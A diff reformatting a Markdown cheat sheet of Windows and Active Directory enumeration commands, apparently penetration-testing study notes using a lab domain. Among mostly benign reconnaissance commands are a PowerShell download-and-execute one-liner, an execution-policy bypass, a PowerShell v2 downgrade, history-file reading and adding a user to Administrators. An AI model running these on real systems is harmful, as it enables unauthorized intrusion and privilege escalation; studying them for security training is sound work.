@@ -25,65 +25,65 @@
 
 # 💻 2. Command Cheat Sheet
 
-|Command|What it does|
-|---|---|
-|`hostname`|Displays the current computer's hostname.|
-|`[System.Environment]::OSVersion.Version`|Displays the Windows OS version and revision.|
-|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Lists installed patches and hotfixes.|
-|`ipconfig /all`|Displays detailed network adapter configuration.|
-|`set`|Displays CMD environment variables.|
-|`echo %USERDOMAIN%`|Displays the current user's domain.|
-|`echo %logonserver%`|Displays the domain controller used by the host.|
-|`systeminfo`|Displays a consolidated summary of system and OS information.|
-|`Get-Module`|Lists PowerShell modules available/loaded in the session.|
-|`Get-ExecutionPolicy -List`|Displays PowerShell execution-policy settings for each scope.|
-|`Set-ExecutionPolicy Bypass -Scope Process`|Bypasses execution policy only for the current PowerShell process.|
-|`Get-ChildItem Env: \| ft Key,Value`|Displays PowerShell environment variables in a readable table.|
-|`Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`|Reads the PowerShell command history file.|
-|`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <follow-on commands>"`|Downloads and executes PowerShell content in memory; requires network access to the URL.|
-|`Get-Host`|Displays information about the current PowerShell host and version.|
-|`powershell.exe -version 2`|Attempts to start Windows PowerShell using version 2.0.|
-|`netsh advfirewall show allprofiles`|Displays Windows Firewall status and configuration for all profiles.|
-|`sc query windefend`|Queries the Windows Defender service status.|
-|`Get-MpComputerStatus`|Displays detailed Microsoft Defender status and configuration information.|
-|`qwinsta`|Displays currently active and disconnected terminal sessions.|
-|`arp -a`|Displays entries currently known in the ARP cache.|
-|`route print`|Displays IPv4/IPv6 routing tables and known network paths.|
-|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Displays detailed computer-system information.|
-|`wmic process list /format:list`|Lists running processes and their properties.|
-|`wmic ntdomain list /format:list`|Displays domain and domain-controller information.|
-|`wmic useraccount list /format:list`|Lists local/domain account information associated with the host.|
-|`wmic group list /format:list`|Lists local groups.|
-|`wmic sysaccount list /format:list`|Displays system/service account information.|
-|`wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress`|Queries domain, forest, and domain-controller information.|
-|`net accounts`|Displays local password/account policy information.|
-|`net accounts /domain`|Displays domain password and account-lockout policy.|
-|`net group /domain`|Lists groups in the domain.|
-|`net group "Domain Admins" /domain`|Lists members of Domain Admins.|
-|`net group "domain computers" /domain`|Lists domain computer accounts.|
-|`net group "Domain Controllers" /domain`|Lists domain-controller computer accounts.|
-|`net group <domain_group_name> /domain`|Displays members of a specified domain group.|
-|`net groups /domain`|Lists domain groups.|
-|`net localgroup`|Lists local groups.|
-|`net localgroup administrators /domain`|Displays members of the domain administrators group.|
-|`net localgroup Administrators`|Displays members of the local Administrators group.|
-|`net localgroup administrators [username] /add`|Adds a user to the local Administrators group.|
-|`net share`|Lists shares exposed by the current host.|
-|`net user <ACCOUNT_NAME> /domain`|Displays information about a domain user.|
-|`net user /domain`|Lists domain users.|
-|`net user %username%`|Displays information about the current user.|
-|`net use x: \\computer\share`|Maps a remote share to a local drive letter.|
-|`net view`|Lists visible computers.|
-|`net view /all /domain[:domainname]`|Displays available domain resources/shares.|
-|`net view \\computer /ALL`|Lists shares on a specific computer.|
-|`net view /domain`|Lists computers in a domain.|
-|`net1`|Native executable that provides functionality equivalent to many `net` commands.|
-|`dsquery user`|Queries AD for user objects.|
-|`dsquery computer`|Queries AD for computer objects.|
-|`dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"`|Performs a wildcard query for objects under a specified AD container.|
-|`dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl`|Searches for user objects matching the `PASSWD_NOTREQD` UAC bit.|
-|`dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName`|Searches for domain controllers using the UAC `SERVER_TRUST_ACCOUNT` bit.|
-|`whoami`|Displays the current security context/user identity.|
+| Command                                                                                                                                                      | What it does                                                                             |
+| ------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------- |
+| `hostname`                                                                                                                                                   | Displays the current computer's hostname.                                                |
+| `[System.Environment]::OSVersion.Version`                                                                                                                    | Displays the Windows OS version and revision.                                            |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                                                                                                      | Lists installed patches and hotfixes.                                                    |
+| `ipconfig /all`                                                                                                                                              | Displays detailed network adapter configuration.                                         |
+| `set`                                                                                                                                                        | Displays CMD environment variables.                                                      |
+| `echo %USERDOMAIN%`                                                                                                                                          | Displays the current user's domain.                                                      |
+| `echo %logonserver%`                                                                                                                                         | Displays the domain controller used by the host.                                         |
+| `systeminfo`                                                                                                                                                 | Displays a consolidated summary of system and OS information.                            |
+| `Get-Module`                                                                                                                                                 | Lists PowerShell modules available/loaded in the session.                                |
+| `Get-ExecutionPolicy -List`                                                                                                                                  | Displays PowerShell execution-policy settings for each scope.                            |
+| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                                                  | Bypasses execution policy only for the current PowerShell process.                       |
+| `Get-ChildItem Env: \| ft Key,Value`                                                                                                                         | Displays PowerShell environment variables in a readable table.                           |
+| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                                                                   | Reads the PowerShell command history file.                                               |
+| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <follow-on commands>"`                                                             | Downloads and executes PowerShell content in memory; requires network access to the URL. |
+| `Get-Host`                                                                                                                                                   | Displays information about the current PowerShell host and version.                      |
+| `powershell.exe -version 2`                                                                                                                                  | Attempts to start Windows PowerShell using version 2.0.                                  |
+| `netsh advfirewall show allprofiles`                                                                                                                         | Displays Windows Firewall status and configuration for all profiles.                     |
+| `sc query windefend`                                                                                                                                         | Queries the Windows Defender service status.                                             |
+| `Get-MpComputerStatus`                                                                                                                                       | Displays detailed Microsoft Defender status and configuration information.               |
+| `qwinsta`                                                                                                                                                    | Displays currently active and disconnected terminal sessions.                            |
+| `arp -a`                                                                                                                                                     | Displays entries currently known in the ARP cache.                                       |
+| `route print`                                                                                                                                                | Displays IPv4/IPv6 routing tables and known network paths.                               |
+| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`                                                                         | Displays detailed computer-system information.                                           |
+| `wmic process list /format:list`                                                                                                                             | Lists running processes and their properties.                                            |
+| `wmic ntdomain list /format:list`                                                                                                                            | Displays domain and domain-controller information.                                       |
+| `wmic useraccount list /format:list`                                                                                                                         | Lists local/domain account information associated with the host.                         |
+| `wmic group list /format:list`                                                                                                                               | Lists local groups.                                                                      |
+| `wmic sysaccount list /format:list`                                                                                                                          | Displays system/service account information.                                             |
+| `wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress`                                                                     | Queries domain, forest, and domain-controller information.                               |
+| `net accounts`                                                                                                                                               | Displays local password/account policy information.                                      |
+| `net accounts /domain`                                                                                                                                       | Displays domain password and account-lockout policy.                                     |
+| `net group /domain`                                                                                                                                          | Lists groups in the domain.                                                              |
+| `net group "Domain Admins" /domain`                                                                                                                          | Lists members of Domain Admins.                                                          |
+| `net group "domain computers" /domain`                                                                                                                       | Lists domain computer accounts.                                                          |
+| `net group "Domain Controllers" /domain`                                                                                                                     | Lists domain-controller computer accounts.                                               |
+| `net group <domain_group_name> /domain`                                                                                                                      | Displays members of a specified domain group.                                            |
+| `net groups /domain`                                                                                                                                         | Lists domain groups.                                                                     |
+| `net localgroup`                                                                                                                                             | Lists local groups.                                                                      |
+| `net localgroup administrators /domain`                                                                                                                      | Displays members of the domain administrators group.                                     |
+| `net localgroup Administrators`                                                                                                                              | Displays members of the local Administrators group.                                      |
+| `net localgroup administrators [username] /add`                                                                                                              | Adds a user to the local Administrators group.                                           |
+| `net share`                                                                                                                                                  | Lists shares exposed by the current host.                                                |
+| `net user <ACCOUNT_NAME> /domain`                                                                                                                            | Displays information about a domain user.                                                |
+| `net user /domain`                                                                                                                                           | Lists domain users.                                                                      |
+| `net user %username%`                                                                                                                                        | Displays information about the current user.                                             |
+| `net use x: \\computer\share`                                                                                                                                | Maps a remote share to a local drive letter.                                             |
+| `net view`                                                                                                                                                   | Lists visible computers.                                                                 |
+| `net view /all /domain[:domainname]`                                                                                                                         | Displays available domain resources/shares.                                              |
+| `net view \\computer /ALL`                                                                                                                                   | Lists shares on a specific computer.                                                     |
+| `net view /domain`                                                                                                                                           | Lists computers in a domain.                                                             |
+| `net1`                                                                                                                                                       | Native executable that provides functionality equivalent to many `net` commands.         |
+| `dsquery user`                                                                                                                                               | Queries AD for user objects.                                                             |
+| `dsquery computer`                                                                                                                                           | Queries AD for computer objects.                                                         |
+| `dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"`                                                                                                             | Performs a wildcard query for objects under a specified AD container.                    |
+| `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl` | Searches for user objects matching the `PASSWD_NOTREQD` UAC bit.                         |
+| `dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName`                                                        | Searches for domain controllers using the UAC `SERVER_TRUST_ACCOUNT` bit.                |
+| `whoami`                                                                                                                                                     | Displays the current security context/user identity.                                     |
 
 ---
 
